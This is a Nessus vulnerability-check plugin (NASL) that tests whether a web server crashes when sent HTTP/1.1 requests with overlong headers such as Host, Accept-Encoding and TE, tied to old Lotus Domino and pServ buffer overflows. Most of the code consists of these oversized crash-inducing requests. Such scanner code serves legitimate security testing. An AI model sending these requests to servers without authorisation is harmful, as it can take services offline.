#
# (C) Tenable Network Security, Inc.
#

# Cf. RFC 2068
#
# Vulnerable servers (not tested)
#
# Domino < 6.0.1
# From: "NGSSoftware Insight Security Research" <nisr@nextgenss.com>
# Subject: Lotus Domino Web Server Host/Location Buffer Overflow Vulnerability (#NISR17022003a)
# To: <bugtraq@securityfocus.com>, <vulnwatch@vulnwatch.org>,
#    <ntbugtraq@listserv.ntbugtraq.com>
# Date: Mon, 17 Feb 2003 16:19:20 -0800
#
# From: "Matthew Murphy" <mattmurphy@kc.rr.com>
# Subject: Multiple pServ Remote Buffer Overflow Vulnerabilities
# To: "BugTraq" <bugtraq@securityfocus.com>
# Date: Sun, 1 Dec 2002 12:15:52 -0600
#

include("compat.inc");

if (description)
{
 script_id(11129);
 script_version("$Revision: 1.32 $");
 script_cvs_date("$Date: 2014/05/27 00:36:24 $");

 script_cve_id("CVE-2003-0180", "CVE-2003-0181");
 script_bugtraq_id(6951);
 script_osvdb_id(10824, 10827);

 script_name(english:"Web Server HTTP 1.1 Header Remote Overflow");
 script_summary(english:"Too long HTTP 1.1 header kills the web server");

 script_set_attribute(attribute:"synopsis", value:"Arbitrary code may be run on the remote server.");
 script_set_attribute(attribute:"description", value:
"It was possible to kill the web server by sending an invalid request
with a too long HTTP 1.1 header (Accept-Encoding, Accept-Language,
Accept-Range, Connection, Expect, If-Match, If-None-Match, If-Range,
If-Unmodified-Since, Max-Forwards, TE, Host).

This vulnerability could be exploited to crash the web server. It
might even be possible to execute arbitrary code on your system.

** As this is a generic test, it is not possible to know if the impact
** is limited to a denial of service.");
 script_set_attribute(attribute:"solution", value:"Upgrade your web server or protect it with a filtering reverse proxy");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2003/02/17");
 script_set_attribute(attribute:"plugin_publication_date", value:"2002/09/21");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
# All the www_too_long_*.nasl scripts were first declared as
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before Nessus
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 script_copyright(english:"This script is Copyright (C) 2002-2014 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");

 script_dependencie("httpver.nasl", "http_version.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/www", 80);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

function send_request_or_whine(port, rq)
{
 local_var r;

 r = http_send_recv_req( port: port, req: rq);
 if (! isnull(r)) return;
 if (http_is_dead(port: port, retry: 3)) # Try to avoid FP
   security_hole(port);
 # Could not send request => network glitch?
 exit(0);
}

port = get_http_port(default: 80, embedded: 1);

if(! get_port_state(port)) exit(0);
if (http_is_dead(port: port)) exit(0);

rq = http_mk_get_req( port: port, item: '/', version: 11,
   add_headers: make_array("Host", crap(1024)) );
send_request_or_whine(port: port, rq: rq);

rq = http_mk_get_req( port: port, item: '/', version: 11,
   add_headers: make_array("Accept-Encoding", crap(4096)+"compress, *") );
send_request_or_whine(port: port, rq: rq);

rq = http_mk_get_req( port: port, item: '/', version: 11,
   add_headers: make_array("Accept-Language", "en, "+crap(4096)) );
send_request_or_whine(port: port, rq: rq);

rq = http_mk_get_req( port: port, item: '/', version: 11,
   add_headers: make_array("Accept-Range", crap(data: "bytes", length: 4096)) );
send_request_or_whine(port: port, rq: rq);

rq = http_mk_get_req( port: port, item: '/', version: 11,
   add_headers: make_array("Connection", crap(data: "close", length: 4096)) );
send_request_or_whine(port: port, rq: rq);

rq = http_mk_get_req( port: port, item: '/', version: 11,
   add_headers: make_array("Expect", crap(data: "=", length: 4096)) );
send_request_or_whine(port: port, rq: rq);

rq = http_mk_get_req( port: port, item: '/', version: 11,
   add_headers: make_array("If-Match", crap(4096)) );
send_request_or_whine(port: port, rq: rq);

rq = http_mk_get_req( port: port, item: '/', version: 11,
   add_headers: make_array("If-None-Match", crap(4096)) );
send_request_or_whine(port: port, rq: rq);

rq = http_mk_get_req( port: port, item: '/', version: 11,
   add_headers: make_array("If-Unmodified-Since",
   "Sat, 29 Oct 1994 19:43:31 "+crap(data: "GMT", length: 1024)) );
send_request_or_whine(port: port, rq: rq);

rq = http_mk_get_req( port: port, item: '/', version: 11,
   add_headers: make_array("Max-Forwards", crap(data: "6", length: 4096)) );
send_request_or_whine(port: port, rq: rq);

rq = http_mk_get_req( port: port, item: '/', version: 11,
   add_headers: make_array("TE", "deflate, "+crap(4096)) );
send_request_or_whine(port: port, rq: rq);

if (http_is_dead(port: port, retry: 3))
{
 security_hole(port);
 exit(0);
}
